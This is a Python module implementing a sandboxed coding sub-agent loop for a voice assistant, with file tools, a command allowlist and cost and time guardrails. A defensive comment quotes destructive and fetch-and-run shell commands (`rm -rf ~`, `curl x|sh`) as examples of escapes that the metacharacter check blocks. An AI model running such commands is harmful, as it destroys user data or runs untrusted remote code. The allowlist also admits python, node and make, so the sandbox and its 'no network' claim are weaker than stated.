"""Native coding sub-agent: a Responses-API tool-calling loop (Prompt 23).

Why native instead of the `@openai/codex` CLI: the CLI ships as a notarized
macOS binary, and OpenAI's 2026 Apple Developer cert rotation (post supply-
chain incident) revoked older builds — Gatekeeper now flags sub-0.119.0
installs as "malware" (false positive, lethal for distribution). Building
the agent inside Emma against the Responses API (already a dependency — it
powers the Realtime session) means single-trust-domain distribution: `uv
sync` ships everything, no second binary, no Gatekeeper, no npm. Same
``gpt-5.3-codex`` model, same per-token cost, same agent-loop pattern Cursor
/ Cline / Aider use internally. See _planning/architecture/coding-agent.md.

The model IS the agent: we give it six sandboxed tools (read/write/edit/
list/run_command/finish), all confined to ``workdir`` (must be a real
directory; every path re-validated under it), then run the
respond → call tools → feed results loop until it calls ``finish``, emits a
plain message, or hits a guardrail (max iters / wall clock / 2x budget).

Refs: developers.openai.com/api/docs/guides/tools (Responses tool calling),
openai.com/index/unrolling-the-codex-agent-loop/ (the pattern).
"""

from __future__ import annotations

import asyncio
import contextlib
import fnmatch
import json
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import structlog
from openai import AsyncOpenAI

from config.settings import settings
from core import events_bus
from tools.file_edit import _atomic_write  # reuse the tested atomic primitive (19.6-B16)
from tools.ide_actions import open_in_ide

log = structlog.get_logger("emma.coding_agent")

_MAX_READ_BYTES = 256 * 1024
_MAX_CMD_OUTPUT = 16 * 1024
# Min gap between actual IDE reveals — a burst of writes opens ONE tab, not 20
# (23.1-B43.2). Every write still emits a coding_agent_file_revealed event.
_REVEAL_THROTTLE_S = 2.0
# Strong refs to in-flight reveal opens so the GC can't drop a fire-and-forget
# task (and so a test can drain them on the same loop before it closes).
_REVEAL_TASKS: set[asyncio.Task[Any]] = set()
_CMD_TIMEOUT_DEFAULT = 60
_SKIP_DIRS = {".git", "node_modules", "__pycache__", ".venv", ".emma_agent", "dist", "build"}

# Allowlisted first-token commands for run_command. Read-only + standard
# build/test/VCS verbs only — no shells, no `rm`, no `curl`.
_CMD_ALLOWLIST = frozenset(
    {
        "git",
        "npm",
        "pnpm",
        "yarn",
        "pytest",
        "ruff",
        "mypy",
        "tsc",
        "node",
        "python",
        "python3",
        "cargo",
        "go",
        "make",
        "ls",
        "cat",
        "grep",
        "head",
        "tail",
        "wc",
        "diff",
    }
)

# (input_per_1M, output_per_1M) USD. developers.openai.com/codex/pricing.
_MODEL_RATES: dict[str, tuple[float, float]] = {
    "gpt-5.3-codex": (1.75, 14.0),
    "gpt-5-codex": (1.25, 10.0),
    "gpt-5.2-codex": (1.75, 14.0),
    "gpt-5.5": (5.0, 30.0),
}
_DEFAULT_RATE = (1.75, 14.0)


def model_rates(model: str) -> tuple[float, float]:
    return _MODEL_RATES.get(model, _DEFAULT_RATE)


def estimate_cost_usd(task: str, model: str) -> float:
    """Rough pre-flight estimate: ~5k tokens of files read + 8k written, plus
    the task. The x1.3 fudge covers tokenization slack."""
    in_rate, out_rate = model_rates(model)
    in_tokens = (len(task.split()) + 5000) * 1.3
    out_tokens = 8000 * 1.3
    return in_tokens / 1e6 * in_rate + out_tokens / 1e6 * out_rate


@dataclass
class AgentRunResult:
    status: str  # ok | blocked | failed | max_iters | budget | timeout | error
    summary: str
    iters_used: int = 0
    cost_usd: float = 0.0
    tool_calls: int = 0
    transcript_path: str = ""


class _Sandbox:
    """The six tools, all confined to ``workdir``."""

    def __init__(self, workdir: Path) -> None:
        self.workdir = workdir
        self.finished: tuple[str, str] | None = None  # (summary, status)

    def _resolve(self, path: str) -> Path:
        """Absolute path under workdir, or raise (the error string is the
        model's feedback — surfaced, never swallowed)."""
        p = (
            (self.workdir / path).resolve()
            if not Path(path).is_absolute()
            else Path(path).resolve()
        )
        if p != self.workdir and not p.is_relative_to(self.workdir):
            raise ValueError(f"path '{path}' escapes the working directory; refused")
        return p

    def read_file(self, path: str) -> str:
        p = self._resolve(path)
        if not p.is_file():
            raise ValueError(f"no such file: {path}")
        data = p.read_bytes()
        if len(data) > _MAX_READ_BYTES:
            raise ValueError(
                f"{path} is {len(data)} bytes (> {_MAX_READ_BYTES}); use run_command "
                "with head/tail to read parts"
            )
        return data.decode("utf-8", errors="replace")

    def write_file(self, path: str, content: str) -> str:
        p = self._resolve(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        _atomic_write(p, content)
        return f"wrote {len(content.encode())} bytes to {path}"

    def edit_file(self, path: str, search: str, replace: str, count: int = 1) -> str:
        p = self._resolve(path)
        if not p.is_file():
            raise ValueError(f"no such file: {path}")
        old = p.read_text(encoding="utf-8")
        if search not in old:
            raise ValueError(f"search text not found in {path}")
        new = old.replace(search, replace, count if count > 0 else -1)
        n = old.count(search) if count < 0 else min(count, old.count(search))
        _atomic_write(p, new)
        return f"replaced {n} occurrence(s) in {path}"

    def list_files(self, path: str = ".", recursive: bool = False, glob: str = "") -> str:
        base = self._resolve(path)
        if not base.is_dir():
            raise ValueError(f"not a directory: {path}")
        out: list[str] = []
        it = base.rglob("*") if recursive else base.iterdir()
        for entry in sorted(it):
            if any(part in _SKIP_DIRS for part in entry.relative_to(base).parts):
                continue
            rel = entry.relative_to(self.workdir).as_posix()
            if glob and not fnmatch.fnmatch(rel, glob):
                continue
            out.append(rel + ("/" if entry.is_dir() else ""))
            if len(out) >= 500:
                out.append("… (truncated at 500 entries)")
                break
        return "\n".join(out) or "(empty)"

    async def run_command(self, command: str, timeout_s: int = _CMD_TIMEOUT_DEFAULT) -> str:
        # The allowlist only inspects the first token, but the command runs
        # through a shell — so `git status; rm -rf ~` or `pytest && curl x|sh`
        # would pass the check yet escape the workdir confinement this class
        # promises. Reject the shell operators that chain, redirect, or
        # substitute, so a single allowlisted command can't break out. (Bare
        # parens are allowed so `python -c "print(1)"` still works; command
        # substitution `$(...)` is caught explicitly.)
        if "$(" in command or any(c in command for c in (";", "&", "|", "`", ">", "<", "\n", "\r")):
            raise ValueError(
                "shell metacharacters are not allowed; run one plain command at a time"
            )
        first = command.strip().split()[0] if command.strip() else ""
        if first not in _CMD_ALLOWLIST:
            raise ValueError(
                f"command '{first}' is not allowlisted; allowed: {', '.join(sorted(_CMD_ALLOWLIST))}"
            )
        proc = await asyncio.create_subprocess_shell(
            command,
            cwd=str(self.workdir),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(
                proc.communicate(), timeout=min(timeout_s, _CMD_TIMEOUT_DEFAULT)
            )
        except TimeoutError:
            proc.kill()
            # Reap the killed process so it doesn't linger as a zombie and so
            # proc.returncode is settled before anyone inspects it.
            with contextlib.suppress(Exception):
                await proc.wait()
            raise ValueError(f"command timed out after {timeout_s}s") from None
        text = (stdout or b"").decode("utf-8", errors="replace")
        if len(text) > _MAX_CMD_OUTPUT:
            text = text[:_MAX_CMD_OUTPUT] + "\n… (output truncated)"
        return f"[exit {proc.returncode}]\n{text}"

    def finish(self, summary: str, status: str = "ok") -> str:
        self.finished = (summary, status if status in ("ok", "blocked", "failed") else "ok")
        return "acknowledged"


def _tool_schemas() -> list[dict[str, Any]]:
    """Responses-API flat function tools (type/name/description/parameters)."""

    def fn(name: str, desc: str, props: dict[str, Any], required: list[str]) -> dict[str, Any]:
        return {
            "type": "function",
            "name": name,
            "description": desc,
            "parameters": {
                "type": "object",
                "properties": props,
                "required": required,
                "additionalProperties": False,
            },
        }

    s = {"type": "string"}
    i = {"type": "integer"}
    b = {"type": "boolean"}
    return [
        fn(
            "read_file",
            "Read a UTF-8 text file (≤256KB) under the working dir.",
            {"path": s},
            ["path"],
        ),
        fn(
            "write_file",
            "Atomically write/overwrite a file under the working dir.",
            {"path": s, "content": s},
            ["path", "content"],
        ),
        fn(
            "edit_file",
            "Literal (not regex) search & replace. count=-1 = all.",
            {"path": s, "search": s, "replace": s, "count": i},
            ["path", "search", "replace"],
        ),
        fn(
            "list_files",
            "List a directory (optionally recursive / glob-filtered).",
            {"path": s, "recursive": b, "glob": s},
            [],
        ),
        fn(
            "run_command",
            "Run an allowlisted shell command in the working dir.",
            {"command": s, "timeout_s": i},
            ["command"],
        ),
        fn(
            "finish",
            "Signal the task is complete. status ∈ ok|blocked|failed.",
            {"summary": s, "status": s},
            ["summary"],
        ),
    ]


_SYSTEM_PROMPT = """You are a coding sub-agent embedded inside Emma, a voice \
assistant. You work autonomously on one task, then stop.

Working directory: {workdir}
Everything you read or write is confined to this directory.

Tools:
- read_file / write_file / edit_file — file operations (atomic writes).
- list_files — explore the tree.
- run_command — only these first tokens are allowed: {allowlist}. No shells, \
no rm, no network. Use git/pytest/ruff/etc.
- finish(summary, status) — CALL THIS when done. summary is spoken to the \
user, so keep it one or two sentences in the user's language. status is ok, \
blocked (needs the user), or failed.

Work in small steps: explore before editing, verify with run_command (run \
the tests / linter if present) before finishing. When the task is done — or \
you're blocked and need the user — call finish. Do not chat; act."""


async def _execute_tool(sandbox: _Sandbox, name: str, args: dict[str, Any]) -> str:
    """Run one sub-agent tool; return the result string (errors included —
    that string is the model's feedback)."""
    try:
        if name == "read_file":
            return sandbox.read_file(args["path"])
        if name == "write_file":
            return sandbox.write_file(args["path"], args["content"])
        if name == "edit_file":
            return sandbox.edit_file(
                args["path"], args["search"], args["replace"], int(args.get("count", 1))
            )
        if name == "list_files":
            return sandbox.list_files(
                args.get("path", "."), bool(args.get("recursive", False)), args.get("glob", "")
            )
        if name == "run_command":
            return await sandbox.run_command(
                args["command"], int(args.get("timeout_s", _CMD_TIMEOUT_DEFAULT))
            )
        if name == "finish":
            return sandbox.finish(args.get("summary", ""), args.get("status", "ok"))
        return f"unknown tool: {name}"
    except Exception as exc:  # the error STRING is the agent's feedback loop
        return f"ERROR: {exc}"


def _reveal_target(sandbox: _Sandbox, name: str, args: dict[str, Any]) -> tuple[str, int] | None:
    """(absolute path, line) to reveal after a successful write/edit, or None.
    write_file → line 1 (whole file); edit_file → the first replacement line."""
    path_arg = args.get("path")
    if not path_arg:
        return None
    try:
        p = sandbox._resolve(str(path_arg))
    except Exception:
        return None
    if not p.is_file():
        return None
    if name == "write_file":
        return str(p), 1
    try:  # edit_file: first replacement keeps its line in the new content
        new = p.read_text(encoding="utf-8")
        replace = str(args.get("replace", "") or "")
        idx = new.index(replace) if replace else -1
        line = new[:idx].count("\n") + 1 if idx >= 0 else 1
    except Exception:
        line = 1
    return str(p), line


def _client() -> AsyncOpenAI:
    return AsyncOpenAI(api_key=settings.openai_api_key(), base_url=settings.openai_base_url())


async def run_agent(
    task: str,
    workdir: str,
    *,
    model: str = "",
    max_iters: int = 0,
    budget_usd: float = 0.0,
    task_id: str = "",
    client: AsyncOpenAI | None = None,
) -> AgentRunResult:
    """Run the coding sub-agent to completion. Background-only (never in the
    Realtime audio loop). Returns the structured result the voice tool reports."""
    wd = Path(workdir).expanduser().resolve()
    if not wd.is_dir():
        return AgentRunResult("error", f"working directory not found: {workdir}")

    model = model or settings.CODING_AGENT_MODEL
    max_iters = max_iters or settings.CODING_AGENT_MAX_ITERS
    budget_usd = budget_usd or settings.CODING_AGENT_MAX_COST_USD
    in_rate, out_rate = model_rates(model)

    sandbox = _Sandbox(wd)
    cli = client or _client()
    tools = _tool_schemas()
    instructions = _SYSTEM_PROMPT.format(
        workdir=str(wd), allowlist=", ".join(sorted(_CMD_ALLOWLIST))
    )
    messages: list[Any] = [{"role": "user", "content": task}]

    transcript_dir = wd / ".emma_agent"
    transcript_dir.mkdir(exist_ok=True)
    (wd / ".gitignore").touch(exist_ok=True)
    _ensure_gitignored(wd / ".gitignore", ".emma_agent/")
    transcript_path = transcript_dir / f"{task_id or 'run'}.jsonl"

    def _record(obj: dict[str, Any]) -> None:
        with transcript_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(obj, ensure_ascii=False, default=str) + "\n")

    _record({"t": "task", "task": task, "model": model, "workdir": str(wd)})

    # --- live reveal (23.1-B43): open the project root, then reveal each write
    # as it lands, throttled to one tab per burst, never blocking the loop. -----
    reveal_times: list[float] = []
    last_write: tuple[str, int] | None = None

    def _spawn_reveal(path: str, line: int, *, project_mode: bool = False) -> None:
        async def _open() -> None:
            with contextlib.suppress(Exception):
                await open_in_ide(path, line=line, project_mode=project_mode)

        task = asyncio.create_task(_open())
        _REVEAL_TASKS.add(task)
        task.add_done_callback(_REVEAL_TASKS.discard)

    def _maybe_reveal(name: str, args: dict[str, Any], result: str) -> None:
        nonlocal last_write
        if name not in ("write_file", "edit_file") or result.startswith("ERROR"):
            return
        target = _reveal_target(sandbox, name, args)
        if target is None:
            return
        path, line = target
        last_write = (path, line)
        events_bus.publish("coding_agent_file_revealed", path=path, line=line)
        now = time.monotonic()
        if any(now - t < _REVEAL_THROTTLE_S for t in reveal_times):
            return  # same burst — signalled, but don't pop another tab
        reveal_times.append(now)
        del reveal_times[:-5]  # keep only the last 5 timestamps
        _spawn_reveal(path, line)

    _spawn_reveal(str(wd), 0, project_mode=True)
    events_bus.publish("coding_agent_project_opened", path=str(wd))

    cost = 0.0
    tool_calls = 0
    deadline = time.monotonic() + settings.CODING_AGENT_TIMEOUT_S
    # store=True + previous_response_id is the canonical reasoning-agent loop:
    # the model's reasoning items persist server-side (live smoke proved that
    # store=False makes echoing them back a 404 — "Items are not persisted").
    # Each turn we send only the NEW input (the user task, then tool outputs)
    # and reference the prior response — cheaper than resending the transcript.
    prev_id: str | None = None
    pending_input: list[Any] = messages

    for it in range(max_iters):
        if time.monotonic() > deadline:
            return AgentRunResult(
                "timeout",
                "Se acabó el tiempo del agente.",
                it,
                cost,
                tool_calls,
                str(transcript_path),
            )
        try:
            create: Any = cli.responses.create
            resp = await create(
                model=model,
                instructions=instructions,
                input=pending_input,
                previous_response_id=prev_id,
                tools=tools,
                tool_choice="auto",
                reasoning={"effort": settings.CODING_AGENT_REASONING},
                store=True,
            )
            prev_id = resp.id
        except Exception as exc:
            log.error("coding_agent_api_error", error=str(exc))
            return AgentRunResult(
                "error",
                f"El agente falló llamando al modelo: {exc}",
                it,
                cost,
                tool_calls,
                str(transcript_path),
            )

        usage = getattr(resp, "usage", None)
        if usage is not None:
            cost += usage.input_tokens / 1e6 * in_rate + usage.output_tokens / 1e6 * out_rate
        else:
            # No usage means the 2x-budget guard below can't see this turn's
            # spend. max_iters still bounds the loop, but log it so a silent
            # cost drift is observable rather than invisible.
            log.warning("coding_agent_missing_usage", iter=it)
        events_bus.publish("coding_agent_cost", cost_usd=round(cost, 4), iter=it)
        if cost > 2 * budget_usd:
            return AgentRunResult(
                "budget",
                f"Paré: el costo pasó ${2 * budget_usd:.2f}.",
                it,
                cost,
                tool_calls,
                str(transcript_path),
            )

        calls = [o for o in resp.output if getattr(o, "type", "") == "function_call"]

        if not calls:
            # Model returned plain text (or nothing) → treat as done.
            summary = resp.output_text.strip() if getattr(resp, "output_text", "") else ""
            _record({"t": "message", "text": summary})
            if summary:
                if last_write is not None:
                    _spawn_reveal(*last_write)
                return AgentRunResult("ok", summary, it + 1, cost, tool_calls, str(transcript_path))
            pending_input = [{"role": "user", "content": "¿Terminaste? Llama a finish."}]
            continue

        # Reasoning + function_call items persist server-side (store=True); we
        # send ONLY the tool outputs as the next turn's input.
        pending_input = []
        for call in calls:
            try:
                args = json.loads(call.arguments or "{}")
            except json.JSONDecodeError as exc:
                log.warning("coding_agent_bad_tool_args", name=call.name, error=str(exc))
                args = {}
            t0 = time.monotonic()
            result = await _execute_tool(sandbox, call.name, args)
            elapsed = int((time.monotonic() - t0) * 1000)
            tool_calls += 1
            events_bus.publish(
                "coding_agent_tool",
                name=call.name,
                args_preview=str(args)[:120],
                elapsed_ms=elapsed,
            )
            _record({"t": "tool", "name": call.name, "args": args, "result": result[:2000]})
            _maybe_reveal(call.name, args, result)
            if settings.CODING_AGENT_SPEAK_PROGRESS and tool_calls % 5 == 0:
                events_bus.publish(
                    "coding_agent_progress",
                    text=f"voy en {Path(str(args.get('path', ''))).name or 'el proyecto'}",
                    tool_calls=tool_calls,
                )
            pending_input.append(
                {"type": "function_call_output", "call_id": call.call_id, "output": result[:30000]}
            )

        if sandbox.finished is not None:
            summary, status = sandbox.finished
            _record({"t": "finish", "summary": summary, "status": status, "cost": round(cost, 4)})
            if last_write is not None:  # ensure the LAST file is visible at the end
                _spawn_reveal(*last_write)
            return AgentRunResult(
                status, summary or "Listo.", it + 1, cost, tool_calls, str(transcript_path)
            )

    if last_write is not None:  # show the last file even if we hit the step cap
        _spawn_reveal(*last_write)
    return AgentRunResult(
        "max_iters",
        f"Llegué al límite de {max_iters} pasos sin terminar. Revisa lo que alcancé.",
        max_iters,
        cost,
        tool_calls,
        str(transcript_path),
    )


def _ensure_gitignored(gitignore: Path, entry: str) -> None:
    try:
        lines = gitignore.read_text(encoding="utf-8").splitlines() if gitignore.exists() else []
        if entry not in lines:
            with gitignore.open("a", encoding="utf-8") as f:
                f.write(("" if not lines or lines[-1] == "" else "\n") + entry + "\n")
    except OSError:
        pass
